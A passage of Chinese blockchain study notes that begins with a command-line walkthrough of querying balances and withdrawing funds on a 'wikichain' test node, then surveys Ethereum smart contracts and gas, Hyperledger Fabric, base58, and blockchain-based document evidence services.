&nbsp;<span class="cm-string">"nHeight"</span> : <span class="cm-number">598</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-string">"vTag"</span> : <span class="cm-string">""</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  },</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-string">"value"</span> : <span class="cm-number">500000000</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-string">"nHeight"</span> : <span class="cm-number">603</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-string">"vTag"</span> : <span class="cm-string">""</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  }</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  ]</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">}</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 1848px;"></div><div class="CodeMirror-gutters" style="display: none; height: 1848px;"></div></div></div></pre><ul><li>时间点 2，查看应用账户信息</li></ul><pre spellcheck="false" class="md-fences md-end-block contain-cm modeLoaded" lang="bash"><div class="CodeMirror cm-s-inner CodeMirror-wrap"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 4px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">root@ubuntu:~/wikichain/tmp/node1<span class="cm-comment"># ./node1 -datadir=. getblockcount</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">615</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">root@ubuntu:~/wikichain/tmp/node1<span class="cm-comment"># ./node1 -datadir=. getappaccinfo 117-1 whmD4M8Q8qbEx6R5gULbcb5ZkedbcRDGY1</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">{</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"mAccUserID"</span> : <span class="cm-string">"77686d44344d3851387162457836523567554c626362355a6b656462635244475931"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"FreeValues"</span> : <span class="cm-number">9500000000</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"vFreezedFund"</span> : [</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  ]</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">}</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 238px;"></div><div class="CodeMirror-gutters" style="display: none; height: 238px;"></div></div></div></pre><h3><a name='header-n1003' class='md-header-anchor '></a>提现</h3><h4><a name='header-n1004' class='md-header-anchor '></a>查看当前余额</h4><pre spellcheck="false" class="md-fences md-end-block contain-cm modeLoaded" lang="bash"><div class="CodeMirror cm-s-inner CodeMirror-wrap"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 4px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">root@ubuntu:~/wikichain/tmp/node1<span class="cm-comment"># ./node1 -datadir=. getbalance whmD4M8Q8qbEx6R5gULbcb5ZkedbcRDGY1</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">{</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"balance"</span> : <span class="cm-number">1004</span>.99900000</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">}</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 123px;"></div><div class="CodeMirror-gutters" style="display: none; height: 123px;"></div></div></div></pre><h4><a name='header-n1006' class='md-header-anchor '></a>提现</h4><p>将自由金额（5个币），提现到地址 whmD4M8Q8qbEx6R5gULbcb5ZkedbcRDGY1</p><p>&nbsp;</p><p>合约内容 = 前缀 1 字节（0xff）+ 操作类型 1 字节（0x01）+ 账户类型 1 字节（0x02）+ 提现金额 8 字节（500000000）</p><p>&nbsp;</p><p>将合约内容转换成16进制字符串</p><p>前缀（0xff）=&gt; ff</p><p>操作类型（0x02）=&gt; 01</p><p>账户类型（0x02）=&gt; 02</p><p>提现金额（500000000）=&gt;</p><p>利用计算器转成 16 进制为1dcd6500，补齐 8 字节后为 000000001dcd6500，按照内存中逆序后为0065cd1d00000000</p><p>&nbsp;</p><p>将这些字段组合在一起，形成合约内容：</p><p>ff01020065cd1d00000000</p><pre spellcheck="false" class="md-fences md-end-block contain-cm modeLoaded" lang="bash"><div class="CodeMirror cm-s-inner CodeMirror-wrap"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 4px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">root@ubuntu:~/wikichain/tmp/node1<span class="cm-comment"># ./node1 -datadir=. createcontracttx whmD4M8Q8qbEx6R5gULbcb5ZkedbcRDGY1 117-1 0 ff01020065cd1d00000000 100000 0</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">{</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"hash"</span> : <span class="cm-string">"502ed951f0e88f8e25d71e0332c315e837b72c390194cd0d64f2be49c75578a2"</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">}</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 123px;"></div><div class="CodeMirror-gutters" style="display: none; height: 123px;"></div></div></div></pre><h4><a name='header-n1034' class='md-header-anchor '></a>再次查看当前余额</h4><blockquote><p>1004.99900000 + 95.00000000 - 0.00100000 = 1099.99800000</p><p><strong>备注：</strong>参数指定提取自由余额 5.00000000，实际上，一次性将所有自由余额 95.00000000 全部提取</p></blockquote><pre spellcheck="false" class="md-fences md-end-block contain-cm modeLoaded" lang="bash"><div class="CodeMirror cm-s-inner CodeMirror-wrap"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 4px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">root@ubuntu:~/wikichain/tmp/node1<span class="cm-comment"># ./node1 -datadir=. getbalance whmD4M8Q8qbEx6R5gULbcb5ZkedbcRDGY1</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">{</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"balance"</span> : <span class="cm-number">1099</span>.99800000</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">}</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 123px;"></div><div class="CodeMirror-gutters" style="display: none; height: 123px;"></div></div></div></pre><h3><a name='header-n1041' class='md-header-anchor '></a>图示余额变化</h3><p><img src='pic/blockchain/free_values.png' alt='' referrerPolicy='no-referrer' /></p><h3><a name='header-n1044' class='md-header-anchor '></a>脚本出错处理</h3><p>当应用账户余额为零时，提现操作将会失败，实现信息已 json 格式输出，具体如下所示：</p><pre spellcheck="false" class="md-fences md-end-block contain-cm modeLoaded" lang="bash"><div class="CodeMirror cm-s-inner CodeMirror-wrap"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 4px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">root@ubuntu:~/wikichain/tmp/node1<span class="cm-comment"># ./node1 -datadir=. getappaccinfo 117-1 whmD4M8Q8qbEx6R5gULbcb5ZkedbcRDGY1</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">{</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"mAccUserID"</span> : <span class="cm-string">"77686d44344d3851387162457836523567554c626362355a6b656462635244475931"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"FreeValues"</span> : <span class="cm-number">0</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"vFreezedFund"</span> : [</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  ]</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">}</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">root@ubuntu:~/wikichain/tmp/node1<span class="cm-comment"># ./node1 -datadir=. createcontracttx whmD4M8Q8qbEx6R5gULbcb5ZkedbcRDGY1 117-1 0 ff01020065cd1d00000000 100000 0</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">error: {<span class="cm-string">"code"</span>:-4,<span class="cm-string">"message"</span>:<span class="cm-string">"Error:run-script-error:luaL_loadbuffer fail:[string \"line\"]:375: Account balance is 0.\n"</span>}</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 284px;"></div><div class="CodeMirror-gutters" style="display: none; height: 284px;"></div></div></div></pre><h2><a name='header-n1048' class='md-header-anchor '></a>以太坊</h2><p>以太坊的目的是基于脚本、竞争币和链上元协议（on-chain meta-protocol）概念进行整合和提高，使得开发者能够创建任意的基于共识的、可扩展的、标准化的、特性完备的、易于开发的和协同的应用。以太坊通过建立终极的抽象的基础层-内置有图灵完备编程语言的区块链-使得任何人都能够创建合约和去中心化应用，并在其中设立他们自由定义的所有权规则、交易方式和状态转换函数。域名币的主体框架只需要两行代码就可以实现，诸如货币和信誉系统等其它协议只需要不到二十行代码就可以实现。智能合约-包含价值而且只有满足某些条件才能打开的加密箱子-也能在我们的平台上创建，并且因为图灵完备性、价值知晓（value-awareness）、区块链知晓（blockchain-awareness）和多状态所增加的力量，而比比特币脚本所能提供的智能合约强大得多。</p><h3><a name='header-n1051' class='md-header-anchor '></a>智能合约</h3><h4><a name='header-n1052' class='md-header-anchor '></a>何为智能合约？</h4><p><strong>以太坊上的程序称之为智能合约</strong>， 它是代码和数据(状态)的集合。</p><p>智能合约可以理解为在区块链上可以自动执行的（由消息驱动的）、以代码形式编写的合同（特殊的交易）。</p><h4><a name='header-n1057' class='md-header-anchor '></a>编程语言：Solidity</h4><blockquote><p>智能合约编程语言有 Viper，Serpent，LLL 及 Bamboo，建议大家还是使用 Solidity。Serpent 官方已经不再推荐，建议 Serpent 的用户转换到 Viper，他们都是类 Python 语言。</p></blockquote><p>智能合约的官方推荐的编程语言是 Solidity，文件扩展名以 .sol 结尾。
Solidity 语言和 JavaScript 很相似，用它来开发合约并编译成以太坊虚拟机字节代码。</p><h4><a name='header-n1064' class='md-header-anchor '></a>运行环境：EVM</h4><p>EVM（Ethereum Virtual Machine）以太坊虚拟机是以太坊中智能合约的运行环境。</p><h4><a name='header-n1067' class='md-header-anchor '></a>合约的编译</h4><p>以太坊虚拟机上运行的是合约的字节码形式，需要我们在部署之前先对合约进行编译，可以选择 <a href='https://ethereum.github.io/browser-solidity'>Browser-Solidity Web IDE </a>或 solc 编译器。</p><h4><a name='header-n1070' class='md-header-anchor '></a>合约的部署</h4><p>在以太坊上开发应用时，常常要使用到以太坊客户端（钱包）。平时我们在开发中，一般不接触到客户端或钱包的概念，它是什么呢？</p><h5><a name='header-n1073' class='md-header-anchor '></a>geth</h5><p><strong>geth</strong>是典型的开发以太坊时使用的客户端，基于 Go 语言开发。 geth 提供了一个交互式命令控制台，通过命令控制台中包含了以太坊的各种功能（API）。</p><blockquote><p>相对于geth，mist 则是图形化操作界面的以太坊客户端。</p></blockquote><h5><a name='header-n1079' class='md-header-anchor '></a>如何部署</h5><p>智能合约的部署是指把合约字节码发布到区块链上，并使用一个特定的地址来标示这个合约，这个地址称为合约账户。</p><blockquote><p>以太坊中有两类账户：</p><ul><li>外部账户
该类账户被私钥控制（由人控制），没有关联任何代码。</li><li>合约账户
该类账户被它们的合约代码控制且有代码与之关联。</li><li>外部账户与合约账户的区别和关系是这样的：一个外部账户可以通过创建和用自己的私钥来对交易进行签名，来发送消息给另一个外部账户或合约账户。</li><li>在两个外部账户之间传送消息是价值转移的过程。但从外部账户到合约账户的消息会激活合约账户的代码，允许它执行各种动作（比如转移代币，写入内部存储，挖出一个新代币，执行一些运算，创建一个新的合约等等）。</li><li>只有当外部账户发出指令时，合约账户才会执行相应的操作。</li></ul></blockquote><p>合约部署就是将编译好的合约字节码通过外部账号发送交易的形式部署到以太坊区块链上（由实际矿工出块之后，才真正部署成功）。</p><h4><a name='header-n1105' class='md-header-anchor '></a>运行</h4><p>合约部署之后，当需要调用这个智能合约的方法时只需要向这个合约账户发送消息（交易）即可，通过消息触发后智能合约的代码就会在 EVM 中执行。</p><h3><a name='header-n1108' class='md-header-anchor '></a>Gas</h3><p>以太坊上用 Gas 机制来计费，Gas 也可以认为是一个工作量单位，智能合约越复杂（计算步骤的数量和类型，占用的内存等），用来完成运行就需要越多 Gas。
任何特定的合约所需的运行合约的 Gas 数量是固定的，由合约的复杂度决定。
而 Gas 价格由运行合约的人在提交运行合约请求的时候规定，以确定他愿意为这次交易愿意付出的费用：Gas 价格（用以太币计价） * Gas数量。</p><p>Gas 的目的是限制执行交易所需的工作量，同时为执行支付费用。当 EVM 执行交易时，Gas 将按照特定规则被逐渐消耗，无论执行到什么位置，一旦 Gas 被耗尽，将会触发 <code>out of gas</code> 异常。当前调用帧所做的所有状态修改都将被回滚， 如果执行结束还有 Gas 剩余，这些 Gas 将被返还给发送账户。</p><blockquote><p>如果没有这个限制，就会有人写出无法停止（如：死循环）的合约来阻塞网络。</p></blockquote><p>因此，实际上需要一个有以太币余额的外部账户，来发起一个交易（普通交易或部署、运行一个合约），运行时，矿工收取相应的工作量费用。</p><h3><a name='header-n1120' class='md-header-anchor '></a>以太坊网络</h3><h4><a name='header-n1406' class='md-header-anchor '></a>使用以太坊正式网络</h4><p>略。</p><h4><a name='header-n1121' class='md-header-anchor '></a>使用以太坊官网测试网络 Testnet</h4><p>测试网络中，我们可以很容易获得免费的以太币，缺点是需要发很长时间初始化节点。</p><h4><a name='header-n1124' class='md-header-anchor '></a>使用私有链</h4><p>创建自己的以太币私有测试网络，通常也称为私有链，我们可以用它来作为一个测试环境来开发、调试和测试智能合约。
通过 geth 很容易就可以创建一个属于自己的测试网络，以太币想挖多少挖多少，也免去了同步正式网络的整个区块链数据。</p><h4><a name='header-n1128' class='md-header-anchor '></a>使用开发者网络（模式）</h4><p>相比私有链，开发者网络（模式）下，会自动分配一个有大量余额的开发者账户给我们使用。</p><h4><a name='header-n1131' class='md-header-anchor '></a>使用模拟环境</h4><p>另一个创建测试网络的方法是使用 testrpc，testrpc 是在本地使用内存模拟的一个以太坊环境，对于开发调试来说，更方便快捷。而且 testrpc 可以在启动时帮我们创建 10 个存有资金的测试账户。进行合约开发时，可以在 testrpc 中测试通过后，再部署到 geth 节点中去。</p><h2><a name='header-n1134' class='md-header-anchor '></a>Hyperledger Fabric</h2><p>Hyperledger Fabric 是 Hyperledger 中的一个区块链项目。与其他区块链技术类似，Hyperledger Fabric 包含一个账本，使用智能合约并且是一个通过所有参与者管理交易的系统。</p><p>Hyperledger Fabric 与其他区块链系统最大的不同体现在<strong>私有</strong>和<strong>许可</strong>。与开放无需许可的网络系统允许未知身份的参与者加入网络不同（需要通过工作量证明协议来保证交易有效并维护网络的安全），Hyperledger Fabric 通过<strong>Membership Service Provider(MSP)</strong>来登记所有的成员。</p><p>Hyperledger Fabric 也提供了多个可拔插选项。账本数据可被存储为多种格式，共识机制可被接入或者断开，同时支持多种不同的 MSP。</p><p>Hyperledger Fabric 提供了建立 <strong>channel</strong> 的功能，这允许参与者为交易新建一个单独的账本。当网络中的一些参与者是竞争对手时，这个功能变得尤为重要。因为这些参与者并不希望所有的交易信息——比如提供给部分客户的特定价格信息——都对网络中所有参与者公开。只有在同一个 channel 中的参与者，才会拥有该 channel 中的账本，而其他不在此 channel 中的参与者则看不到这个账本。</p><h2><a name='header-n1143' class='md-header-anchor '></a>区块链技术</h2><h3><a name='header-n1144' class='md-header-anchor '></a>定义</h3><p>区块链：<strong>由使用密码学原理使之连接和保证安全的块</strong>所组成的一个不断增长的数据记录列表。每一个区块包含一个前一个区块的密码学哈希值、一个时间戳，和交易数据。</p><h3><a name='header-n1147' class='md-header-anchor '></a>分类</h3><p>根据参与者的不同，可以分为公开（Public）链、联盟（Consortium）链和私有（Private）链。</p><p>公开链，顾名思义，任何人都可以参与使用和维护，典型的如比特币区块链，信息是完全公开的。</p><p>如果引入许可机制，包括私有链和联盟链两种。</p><p>私有链，则是集中管理者进行限制，只能得到内部少数人可以使用，信息不公开。</p><p>联盟链则介于两者之间，由若干组织一起合作维护一条区块链，该区块链的使用必须是有权限的管理，相关信息会得到保护，典型如银联组织。</p><h3><a name='header-n1158' class='md-header-anchor '></a>商业价值</h3><p>现代商业的典型模式为，交易方通过协商和执行合约，完成交易过程。区块链擅长的正是如何管理合约，确保合约的顺利执行。根据类别和应用场景不同，区块链所体现的特点和价值也不同。</p><p>从技术特点上，区块链一般被认为具有：</p><ul><li><p>分布式容错性：网络极其鲁棒，容错 1/3 左右节点的异常状态</p></li><li><p>不可篡改性：一致提交后的数据会一直存在，不可被销毁或修改</p></li><li><p>隐私保护性：密码学保证了未经授权者能访问到数据，但无法解析</p><p>随之带来的业务特性将可能包括：</p></li><li><p>可信任性：区块链技术可以提供天然可信的分布式账本平台，不需要额外第三方中介机构</p></li><li><p>降低成本：跟传统技术相比，区块链技术可能带来更短的时间、更少的人力和维护成本</p></li><li><p>增强安全：区块链技术将有利于安全可靠的审计管理和账目清算，减少犯罪可能性，和各种风险</p></li></ul><h3><a name='header-n1184' class='md-header-anchor '></a>理论/技术点</h3><h4><a name='header-n1185' class='md-header-anchor '></a>图灵完全</h4><p>图灵完全性通常指具有无限存储能力的通用物理机器或编程语言。简单来说，一切可计算的问题都能计算（给定足够的时间和存储），这样的虚拟机或者编程语言就叫图灵完备的。</p><h4><a name='header-n1188' class='md-header-anchor '></a>base58</h4><p>用于 bitcoin 中使用的一种独特的编码方式，主要用于产生 bitcoin  的钱包地址。相比 base64，base58 不使用数字&quot;0&quot;，字母大写&quot;O&quot;，字母大写&quot;I&quot;，和字母小写&quot;l&quot;，以及&quot;+&quot;和&quot;/&quot;符号。
设计 base58 主要的目的是：</p><ol start='' ><li>避免混淆。在某些字体下，数字 0 和字母大写 O，以及字母大写 I 和字母小写 l 会非常相似。</li><li>不使用&quot;+&quot;和&quot;/&quot;的原因是非字母或数字的字符串作为帐号较难被接受。</li><li>没有标点符号，通常不会被从中间分行。</li><li>大部分的软件支持双击选择整个字符串。</li></ol><p><strong>base58 与 base64 的差异：</strong>base64 编码中使用直接截取 3 个字符转 4 个字符的方法进行转换，而是采用我们数学上经常使用的进制转换方法——辗转相除法。</p><h3><a name='header-n1207' class='md-header-anchor '></a>应用场景</h3><p>区块链属于一种去中心化的记录技术。参与到系统上的节点，可能不属于同一组织，彼此互不信任；区块链数据由所有节点共同维护，每个参与维护节点都能复制获得一份完整记录的拷贝。跟传统的数据库技术相比，其特点应该包括：</p><ul><li>维护一条不断增长的链，只可能添加记录，而发生过的记录都不可篡改</li><li>去中心化，或者说多中心化，无集中的控制，实现上尽量分布式</li><li>可以通过密码学的机制来确保交易无法抵赖和破坏，并尽量保护用户信息和记录的隐私性</li></ul><p>更进一步的，还可以将智能合约跟区块链结合到一起，让其提供除了交易功能外更灵活的合约功能，执行更为复杂的操作（实际上，比特币区块链已经支持简单的脚本计算）。这样扩展之后的区块链，已经超越了单纯数据记录的功能了，实际上带有“普适计算”的意味了。</p><figure><table><thead><tr><th>定位</th><th>功能</th><th>智能合约</th><th>一致性</th><th>权限</th><th>类型</th><th>性能</th><th>代表</th></tr></thead><tbody><tr><td>公信的数字货币</td><td>记账功能</td><td>不带有或较弱</td><td>PoW</td><td>无</td><td>公有链</td><td>较低</td><td>比特币</td></tr><tr><td>公信的交易处理</td><td>智能合约</td><td>图灵完备</td><td>PoW、PoS</td><td>无</td><td>公有链</td><td>受限</td><td>以太坊</td></tr><tr><td>带权限的交易处理</td><td>商业处理</td><td>多种语言，图灵完备</td><td>多种，可插拔</td><td>支持</td><td>联盟链</td><td>可扩展</td><td>Hyperledger</td></tr></tbody></table></figure><h4><a name='header-n1259' class='md-header-anchor '></a>存证业务</h4><p><strong>联盟链和公有链结合的存证业务</strong></p><p>存证业务的流程相当明晰，首先是双方基于电子签名技术，在电子合同上签约，第三方存证平台提供一个服务，将合同文件进行哈希后，将哈希值妥善存储即可。</p><p>但这里存在一个问题，那就是第三方平台本身的信用。第三方平台出于某种利益，是否会更改合同的哈希值，一旦更改，该合同的有效性就会受到质疑，从而引发纠纷。</p><p>为了解决这个问题，公证通（Factom）等公司选择将文件的哈希值存入比特币的区块链中，由于比特币区块链的不可更改性，即便是公证通这家存证公司本身都无法篡改其哈希值，从而在根本上保障了合同真伪校验的有效性。</p><p>但是，使用公有链依然具有局限性，一是公有链的确认速度很慢，二是公有链的交易手续费会越来越高，导致业务成本高企。</p><p>因此，我建议将联盟链置于用户数据和公有链之间。如下图所示，是保全网的方案，采用了 Factom 的技术，而联盟链公司可以将中间的锚定链替换为自身的联盟链，从而提高用户存证的确认速度，并且多个数据最终做一次哈希，可大大降低比特币网络的交易次数，从而降低成本。</p><p><img src='pic/blockchain/deposit.png' alt='img' referrerPolicy='no-referrer' /></p><p><strong>联盟链的作用和公有链的作用</strong></p><p>最终必然有一个疑问，既然底层最终锚定了公有链，那么联盟链的作用在哪里。我认为联盟链的作用有三个，一是，如果某个机构希望在本地拥有其文件的哈希数据，那么只需要布置一个联盟链的节点即可。二是，联盟链可以大大提高存证的确认速度，同时联盟链未来可以支持更高的存证并发数。三是，即便最终想要切断联盟链和公有链的联系，有一个联盟链在中间层做保障，也是非常方便的一件事。</p><p>当联盟链中的节点足够多之后，其存证的公信力也将愈发强大，但在联盟链推动的初期，若没有底层公有链的信用加成，前期推动的难度非常大，要花费极多的口舌去进行市场教育，这也是联盟链公司一个不可忽视的机会成本。</p><p><strong>电子合同及合同存证的巨大价值</strong></p><p>人类社会之所以得到发展，“契约精神”起到了不可磨灭的作用，但是持续了几千年的纸质“契约”，纸质合同，已经难以跟上这个飞速发展的互联网世界。</p><p>设想一个人从小到大的成长过程，要接触各种各样的合同：入学有合同、银行开户有合同、买房有合同、买车有合同，说得夸张一些，可谓是“凡事皆契约”，“一切皆合同”。甚至我让同事帮我买一杯奶茶，欠个15块钱，本质上也是一个口头契约。但如果所有的合同都是纸质的，谁又能保存和检索如此多的纸质合同呢？</p><p>对企业来说更是如此，仅仅是员工的聘用合同，这一类的合同，就需要整个HR部门花费巨大的力气保存和检索，万一丢失纸质合同，又会引发一系列的纷争。所以，这是一个亟待解决的重要问题。</p><p>电子合同的网上签约、第三方存管、合同真伪查询、一站式的合同模板提供、合同规范性的校验，这些都是一个大大的蓝海市场，切不可错过。</p><p><strong>存证业务的进一步拓展</strong></p><p>电子合同仅仅是存证业务中的一种而已，之所以选择从合同的存证切入市场，是因为这个场景确实在现阶段成为了企业和个人的一个痛点。</p><p>未来，除了合同以外的任何电子证据都可以存储在区块链存证平台中，例如人的身份证明，或者票据、学历证明、工作履历等等。</p>